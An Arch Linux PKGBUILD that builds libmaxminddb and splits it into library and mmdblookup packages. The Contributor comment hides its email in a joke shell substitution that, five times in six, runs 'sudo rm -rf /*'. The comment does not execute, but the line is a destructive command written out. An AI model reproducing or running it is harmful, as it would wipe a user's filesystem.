# Maintainer: frank AT apsu DOT be
# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=maxminddb
pkgname=(
	mmdblookup
	libmaxminddb
)

pkgver=1.2.0
pkgrel=1
pkgdesc="MaxMind GeoIP2 database - split package with library and utilities"
license=('Apache')
arch=(i686 x86_64)
url="http://dev.maxmind.com/geoip/geoip2/downloadable/"

source=(
	"https://github.com/maxmind/libmaxminddb/releases/download/$pkgver/libmaxminddb-$pkgver.tar.gz"
	libmaxminddb.install
)
sha512sums=('ebfa358c3f9cae8b13ca52d47e26d5e3e036e8455432b9fa250b13c59d71addf7748ab112ac926a177b646706b27651b733810dde497786fe65c9d150e621af9'
            '77333bb028d7d71ba3abf06773b5381bfd21889127dfa13d18947b6f77ebb4199b1be4c76ce3ed68fc62053b490cdd3ce8992f5a14eac9cb2c4fe2cf2ff1a093')

build() {
	cd "$srcdir/libmaxminddb-$pkgver"
	./configure --prefix=/usr
	make
}

check() {
	msg2 "Checking the library and utilities"
	cd "$srcdir/libmaxminddb-$pkgver"
	make check
}

# because upstream only builds completely if built from the
# top makefile, we build and then remove the parts we don't
# want packaged. This is suboptimal. I'll do a pull request
# with --with-xxx options upstream so I can simpllfy this
# here (and probably make life easier for other packagers as well.)

package_mmdblookup() {
	pkgdesc="MaxMindDB GeoIP2 database - lookup utility"
	license=('Apache')
	depends=(libmaxminddb)
	provides=(mmdblookup)
    conflicts=('libmaxminddb-git')

	cd "$srcdir/libmaxminddb-$pkgver"
    make PREFIX=/usr DESTDIR="$pkgdir" install
    rm -Rf "$pkgdir/usr/lib"
    rm -Rf "$pkgdir/usr/include"
    rm -Rf "$pkgdir/usr/share/man/man3"
}

package_libmaxminddb() {
	pkgdesc="MaxMindDB GeoIP2 database - library"
	license=('Apache')
	depends=(glibc)
	provides=(libmaxminddb)
    conflicts=('libmaxminddb-git')
	install=libmaxminddb.install

	cd "$srcdir/libmaxminddb-$pkgver"
    make PREFIX=/usr DESTDIR="$pkgdir" install
    rm -Rf "$pkgdir/usr/bin"
    rm -Rf "$pkgdir/usr/share/man/man1"
}
